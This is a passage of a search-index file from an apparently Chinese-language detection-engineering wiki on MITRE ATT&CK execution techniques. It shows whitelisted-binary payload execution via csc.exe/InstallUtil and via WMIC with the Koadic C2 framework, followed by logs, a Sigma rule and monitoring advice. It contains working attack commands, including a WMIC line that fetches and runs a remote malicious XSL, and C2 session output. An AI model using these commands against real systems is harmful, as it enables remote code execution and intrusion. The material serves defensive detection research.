[DllImport(\"kernel32\")] private static extern IntPtr GetModuleHandle( string moduleName ); [DllImport(\"kernel32\")] private static extern UInt32 GetProcAddress( IntPtr hModule, string procName ); [DllImport(\"kernel32\")] private static extern UInt32 LoadLibrary( string lpFileName ); [DllImport(\"kernel32\")] private static extern UInt32 GetLastError(); }","title":"Micropoor_Csc.cs"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_6","text":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:1.exe /platform:x64 /unsafe C:\\Users\\Administrator\\Desktop\\a\\1.cs C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Administrator\\Desktop\\a\\1.exe","title":"\u9776\u673a\u6267\u884c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_7","text":"\u672a\u80fd\u6210\u529f\u83b7\u53d6\u4f1a\u8bdd\uff0c\u4f46\u4e0d\u5f71\u54cd\u9488\u5bf9\u6b64\u884c\u4e3a\u8fdb\u884c\u5206\u6790\u3002","title":"\u83b7\u53d6\u4f1a\u8bdd"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_8","text":"\u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID:0xa9c \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0xaa0 \u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:1.exe /platform:x64 /unsafe C:\\Users\\Administrator\\Desktop\\a\\1.cs \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID:0x984 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0xaa0 \u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Administrator\\Desktop\\a\\1.exe","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_9","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#sigma","text":"title: Suspicious Parent of Csc.exe description: Detects a suspicious parent of csc.exe, which could by a sign of payload delivery status: experimental references: - https://twitter.com/SBousseaden/status/1094924091256176641 tags: - attack.defense_evasion - attack.t1027-004 logsource: category: process_creation product: windows detection: selection: Image: '*\\csc.exe*' ParentImage: - '*\\wscript.exe' - '*\\cscript.exe' - '*\\mshta.exe' condition: selection falsepositives: - Unkown level: high","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_10","text":"\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_11","text":"MITRE-ATT&CK-T1027-004 https://attack.mitre.org/techniques/T1027/004/ \u57fa\u4e8e\u767d\u540d\u5355Csc.exe\u6267\u884cpayload\u7b2c\u4e03\u5b63 https://micro8.gitbook.io/micro8/contents-1/71-80/77-ji-yu-bai-ming-dan-csc.exe-zhi-hang-payload-di-qi-ji","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/","text":"T1047-win-\u57fa\u4e8e\u767d\u540d\u5355WMIC\u6267\u884cpayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 WMI\uff08Windows Management Instrumentation\uff09\u662fWindows\u7ba1\u7406\u529f\u80fd\uff0c\u5b83\u4e3a\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95eewindows\u7cfb\u7edf\u7ec4\u4ef6\u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u73af\u5883\u3002\u5b83\u4f9d\u8d56WMI\u670d\u52a1\u6765\u8fdb\u884c\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95ee\uff0c\u4ee5\u53caSMB\uff08\u670d\u52a1\u5668\u6d88\u606f\u5757\uff09\u548cRPCS\uff08\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u670d\u52a1\uff09\u6765\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u3002RPCS\u901a\u8fc7\u7aef\u53e3135\u8fd0\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528WMI\u4e0e\u672c\u5730\u548c\u8fdc\u7a0b\u7cfb\u7edf\u4ea4\u4e92\uff0c\u4e5f\u53ef\u80fd\u4f7f\u7528WMI\u6765\u5c06\u6267\u884c\u8bb8\u591a\u7b56\u7565\u529f\u80fd\uff0c\u4f8b\u5982\u4e3a\u53d1\u73b0\u6536\u96c6\u4fe1\u606f\u548c\u8fdc\u7a0b\u6267\u884c\u6587\u4ef6\u6765\u6a2a\u5411\u79fb\u52a8\u3002 \u6d4b\u8bd5\u6848\u4f8b WMIC\u6269\u5c55WMI\uff08Windows Management Instrumentation\uff0cWindows\u7ba1\u7406\u5de5\u5177\uff09\uff0c\u63d0\u4f9b\u4e86\u4ece\u547d\u4ee4\u884c\u63a5\u53e3\u548c\u6279\u547d\u4ee4\u811a\u672c\u6267\u884c\u7cfb\u7edf\u7ba1\u7406\u7684\u652f\u6301\u3002\u5728WMIC\u51fa\u73b0\u4e4b\u524d\uff0c\u5982\u679c\u8981\u7ba1\u7406WMI\u7cfb\u7edf\uff0c\u5fc5\u987b\u4f7f\u7528\u4e00\u4e9b\u4e13\u95e8\u7684WMI\u5e94\u7528\uff0c\u4f8b\u5982SMS\uff0c\u6216\u8005\u4f7f\u7528WMI\u7684\u811a\u672c\u7f16\u7a0bAPI\uff0c\u6216\u8005\u4f7f\u7528\u8c61CIM Studio\u4e4b\u7c7b\u7684\u5de5\u5177\u3002\u5982\u679c\u4e0d\u719f\u6089C++\u4e4b\u7c7b\u7684\u7f16\u7a0b\u8bed\u8a00\u6216VBScript\u4e4b\u7c7b\u7684\u811a\u672c\u8bed\u8a00\uff0c\u6216\u8005\u4e0d\u638c\u63e1WMI\u540d\u79f0\u7a7a\u95f4\u7684\u57fa\u672c\u77e5\u8bc6\uff0c\u8981\u7528WMI\u7ba1\u7406\u7cfb\u7edf\u662f\u5f88\u56f0\u96be\u7684\u3002WMIC\u6539\u53d8\u4e86\u8fd9\u79cd\u60c5\u51b5\u3002 \u8bf4\u660e\uff1aWmic.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cWmic\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Wmic\u8c03\u7528\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\WINDOWS\\system32\\wbem\\wmic.exe C:\\WINDOWS\\SysWOW64\\wbem\\wmic.exe Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\wbem\\WMIC.exe C:\\Windows\\SysWOW64\\wbem\\WMIC.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7 \u653b\u51fb\u5206\u6790 Koadic \u901a\u8fc7Koadic\u53d1\u8d77Wmic.exe\u653b\u51fb koadic\u662f\u4e00\u4e2a\u547d\u4ee4\u63a7\u5236\uff08C2\uff09\u5de5\u5177\uff0c\u7c7b\u4f3cMetasploit\u548cPowershell Empire\u3002\u4f7f\u7528koadic\u6211\u4eec\u751f\u6210\u6076\u610fXSL\u6587\u4ef6\u3002koadic\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u60a8\u53ef\u4ee5\u8fd0\u884c./koadic \u6587\u4ef6\u4ee5\u542f\u52a8 koadic\uff0c\u7136\u540e\u901a\u8fc7\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u5f00\u59cb\u52a0\u8f7dstager/js/wmic \u7a0b\u5e8f\uff0c\u5e76\u5c06 SRVHOST \u8bbe\u7f6e\u4e3a\u7a0b\u5e8f\u56de\u8fdeIP\u3002 git clone https://github.com/zerosum0x0/koadic.git #\u5b89\u88c5\u547d\u4ee4 cd koadic pip3 install -r requirements.txt #\u52a0\u8f7d\u8f7d\u8377 ./koadic (koadic: sta/js/mshta)# use stager/js/wmic (koadic: sta/js/wmic)# set SRVHOST 192.168.126.146 [+] SRVHOST => 192.168.126.146 (koadic: sta/js/wmic)# run [+] Spawned a stager at http://192.168.126.146:9996/6G69i.xsl [>] wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\" \u9776\u673a\u6267\u884cpayload \u6267\u884c WMIC \u4ee5\u4e0b\u547d\u4ee4\uff0c\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0b\u8f7d\u548c\u8fd0\u884c\u6076\u610fXSL\u6587\u4ef6\uff1a wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\" \u9776\u673a\u6d4b\u8bd5\u7ed3\u679c C:\\Users\\12306Br0>wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\" os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\"12306BR0-PCroot\\cimv2roo t\\cliIMPERSONATEPKTPRIVACYms_804ENABLEOFFN/AOFFOFFSTDOUTSTDOUTN/AON\\Device\\Hardd iskVolume17601Multiprocessor FreeMicrosoft Windows 7 \u65d7\u8230\u7248 93686Win32_Operating SystemWin32_ComputerSystemService Pack 112306BR0-PC480TRUETRUETRUE2FALSEFALSE256 29608362009844309911620200305144428.000000+48020200305151330.500000+480202004171 72815.995000+4800804Microsoft Corporation-18589934464zh-CNMicrosoft Windows 7 \u65d7 \u8230\u7248 |C:\\Windows|\\Device\\Harddisk0\\Partition2422164-bit205225618TRUE112306Br0004 26-292-0000007-85792102343416OK272\\Device\\HarddiskVolume2C:\\Windows\\system32C:44 4004820966326.1.7601C:\\Windows \u53cd\u5f39shell \u4e00\u65e6\u6076\u610f\u7684XSL\u6587\u4ef6\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\uff0c\u4f60\u5c06\u6709\u4e00\u4e2a\u50f5\u5c38\u8fde\u63a5\uff0c\u5c31\u50cfMetasploit\u56de\u8fde\u7684\u60c5\u51b5\u4e00\u6837\u3002 [+] Zombie 0: Staging new connection (192.168.126.149) on Stager 0 [+] Zombie 0: 12306Br0-PC\\12306Br0 @ 12306BR0-PC -- Windows 7 Ultimate [!] Zombie 0: Timed out. [+] Zombie 0: Re-connected. (koadic: sta/js/wmic)# zombies 0 ID: 0 Status: Alive First Seen: 2020-04-17 17:28:31 Last Seen: 2020-04-17 17:29:04 Listener: 0 IP: 192.168.126.149 User: 12306Br0-PC\\12306Br0 Hostname: 12306BR0-PC Primary DC: Unknown OS: Windows 7 Ultimate OSBuild: 7601 OSArch: 64 Elevated: No User Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0) Session Key: 02149f1202e3437ab7932672c0c9e6b5 JOB NAME STATUS ERRNO ---- --------- ------- ------- \u6d4b\u8bd5\u7559\u75d5 #sysmon\u65e5\u5fd7 EventID: 1 Image: C:\\Windows\\System32\\wbem\\WMIC.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: WMI Commandline Utility Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: wmic.exe CommandLine: wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\" #win7\u5b89\u5168\u65e5\u5fd7 EventID\uff1a4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x888 \u65b0\u8fdb\u7a0b\u540d: 'C:\\Windows\\System32\\wbem\\WMIC.exe' \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0\u5177\u4f53\u68c0\u6d4b\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1047: https://attack.mitre.org/techniques/T1047/ windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0a\uff09: http://www.safe6.cn/article/155","title":"T1047-win-\u57fa\u4e8e\u767d\u540d\u5355WMIC\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#t1047-win-wmicpayload","text":"","title":"T1047-win-\u57fa\u4e8e\u767d\u540d\u5355WMIC\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#attck","text":"WMI\uff08Windows Management Instrumentation\uff09\u662fWindows\u7ba1\u7406\u529f\u80fd\uff0c\u5b83\u4e3a\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95eewindows\u7cfb\u7edf\u7ec4\u4ef6\u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u73af\u5883\u3002\u5b83\u4f9d\u8d56WMI\u670d\u52a1\u6765\u8fdb\u884c\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95ee\uff0c\u4ee5\u53caSMB\uff08\u670d\u52a1\u5668\u6d88\u606f\u5757\uff09\u548cRPCS\uff08\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u670d\u52a1\uff09\u6765\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u3002RPCS\u901a\u8fc7\u7aef\u53e3135\u8fd0\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528WMI\u4e0e\u672c\u5730\u548c\u8fdc\u7a0b\u7cfb\u7edf\u4ea4\u4e92\uff0c\u4e5f\u53ef\u80fd\u4f7f\u7528WMI\u6765\u5c06\u6267\u884c\u8bb8\u591a\u7b56\u7565\u529f\u80fd\uff0c\u4f8b\u5982\u4e3a\u53d1\u73b0\u6536\u96c6\u4fe1\u606f\u548c\u8fdc\u7a0b\u6267\u884c\u6587\u4ef6\u6765\u6a2a\u5411\u79fb\u52a8\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_1","text":"WMIC\u6269\u5c55WMI\uff08Windows Management Instrumentation\uff0cWindows\u7ba1\u7406\u5de5\u5177\uff09\uff0c\u63d0\u4f9b\u4e86\u4ece\u547d\u4ee4\u884c\u63a5\u53e3\u548c\u6279\u547d\u4ee4\u811a\u672c\u6267\u884c\u7cfb\u7edf\u7ba1\u7406\u7684\u652f\u6301\u3002\u5728WMIC\u51fa\u73b0\u4e4b\u524d\uff0c\u5982\u679c\u8981\u7ba1\u7406WMI\u7cfb\u7edf\uff0c\u5fc5\u987b\u4f7f\u7528\u4e00\u4e9b\u4e13\u95e8\u7684WMI\u5e94\u7528\uff0c\u4f8b\u5982SMS\uff0c\u6216\u8005\u4f7f\u7528WMI\u7684\u811a\u672c\u7f16\u7a0bAPI\uff0c\u6216\u8005\u4f7f\u7528\u8c61CIM Studio\u4e4b\u7c7b\u7684\u5de5\u5177\u3002\u5982\u679c\u4e0d\u719f\u6089C++\u4e4b\u7c7b\u7684\u7f16\u7a0b\u8bed\u8a00\u6216VBScript\u4e4b\u7c7b\u7684\u811a\u672c\u8bed\u8a00\uff0c\u6216\u8005\u4e0d\u638c\u63e1WMI\u540d\u79f0\u7a7a\u95f4\u7684\u57fa\u672c\u77e5\u8bc6\uff0c\u8981\u7528WMI\u7ba1\u7406\u7cfb\u7edf\u662f\u5f88\u56f0\u96be\u7684\u3002WMIC\u6539\u53d8\u4e86\u8fd9\u79cd\u60c5\u51b5\u3002 \u8bf4\u660e\uff1aWmic.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cWmic\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Wmic\u8c03\u7528\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\WINDOWS\\system32\\wbem\\wmic.exe C:\\WINDOWS\\SysWOW64\\wbem\\wmic.exe Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\wbem\\WMIC.exe C:\\Windows\\SysWOW64\\wbem\\WMIC.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#koadic","text":"\u901a\u8fc7Koadic\u53d1\u8d77Wmic.exe\u653b\u51fb koadic\u662f\u4e00\u4e2a\u547d\u4ee4\u63a7\u5236\uff08C2\uff09\u5de5\u5177\uff0c\u7c7b\u4f3cMetasploit\u548cPowershell Empire\u3002\u4f7f\u7528koadic\u6211\u4eec\u751f\u6210\u6076\u610fXSL\u6587\u4ef6\u3002koadic\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u60a8\u53ef\u4ee5\u8fd0\u884c./koadic \u6587\u4ef6\u4ee5\u542f\u52a8 koadic\uff0c\u7136\u540e\u901a\u8fc7\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u5f00\u59cb\u52a0\u8f7dstager/js/wmic \u7a0b\u5e8f\uff0c\u5e76\u5c06 SRVHOST \u8bbe\u7f6e\u4e3a\u7a0b\u5e8f\u56de\u8fdeIP\u3002 git clone https://github.com/zerosum0x0/koadic.git #\u5b89\u88c5\u547d\u4ee4 cd koadic pip3 install -r requirements.txt #\u52a0\u8f7d\u8f7d\u8377 ./koadic (koadic: sta/js/mshta)# use stager/js/wmic (koadic: sta/js/wmic)# set SRVHOST 192.168.126.146 [+] SRVHOST => 192.168.126.146 (koadic: sta/js/wmic)# run [+] Spawned a stager at http://192.168.126.146:9996/6G69i.xsl [>] wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\"","title":"Koadic"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#payload","text":"\u6267\u884c WMIC \u4ee5\u4e0b\u547d\u4ee4\uff0c\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0b\u8f7d\u548c\u8fd0\u884c\u6076\u610fXSL\u6587\u4ef6\uff1a wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\" \u9776\u673a\u6d4b\u8bd5\u7ed3\u679c C:\\Users\\12306Br0>wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\" os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\"12306BR0-PCroot\\cimv2roo t\\cliIMPERSONATEPKTPRIVACYms_804ENABLEOFFN/AOFFOFFSTDOUTSTDOUTN/AON\\Device\\Hardd iskVolume17601Multiprocessor FreeMicrosoft Windows 7 \u65d7\u8230\u7248 93686Win32_Operating SystemWin32_ComputerSystemService Pack 112306BR0-PC480TRUETRUETRUE2FALSEFALSE256 29608362009844309911620200305144428.000000+48020200305151330.500000+480202004171 72815.995000+4800804Microsoft Corporation-18589934464zh-CNMicrosoft Windows 7 \u65d7 \u8230\u7248 |C:\\Windows|\\Device\\Harddisk0\\Partition2422164-bit205225618TRUE112306Br0004 26-292-0000007-85792102343416OK272\\Device\\HarddiskVolume2C:\\Windows\\system32C:44 4004820966326.1.7601C:\\Windows","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#shell","text":"\u4e00\u65e6\u6076\u610f\u7684XSL\u6587\u4ef6\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\uff0c\u4f60\u5c06\u6709\u4e00\u4e2a\u50f5\u5c38\u8fde\u63a5\uff0c\u5c31\u50cfMetasploit\u56de\u8fde\u7684\u60c5\u51b5\u4e00\u6837\u3002 [+] Zombie 0: Staging new connection (192.168.126.149) on Stager 0 [+] Zombie 0: 12306Br0-PC\\12306Br0 @ 12306BR0-PC -- Windows 7 Ultimate [!] Zombie 0: Timed out. [+] Zombie 0: Re-connected. (koadic: sta/js/wmic)# zombies 0 ID: 0 Status: Alive First Seen: 2020-04-17 17:28:31 Last Seen: 2020-04-17 17:29:04 Listener: 0 IP: 192.168.126.149 User: 12306Br0-PC\\12306Br0 Hostname: 12306BR0-PC Primary DC: Unknown OS: Windows 7 Ultimate OSBuild: 7601 OSArch: 64 Elevated: No User Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0) Session Key: 02149f1202e3437ab7932672c0c9e6b5 JOB NAME STATUS ERRNO ---- --------- ------- -------","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_6","text":"#sysmon\u65e5\u5fd7 EventID: 1 Image: C:\\Windows\\System32\\wbem\\WMIC.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: WMI Commandline Utility Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: wmic.exe CommandLine: wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\" #win7\u5b89\u5168\u65e5\u5fd7 EventID\uff1a4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x888 \u65b0\u8fdb\u7a0b\u540d: 'C:\\Windows\\System32\\wbem\\WMIC.exe'","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_7","text":"\u65e0\u5177\u4f53\u68c0\u6d4b\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_8","text":"MITRE-ATT&CK-T1047: https://attack.mitre.org/techniques/T1047/ windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0a\uff09: 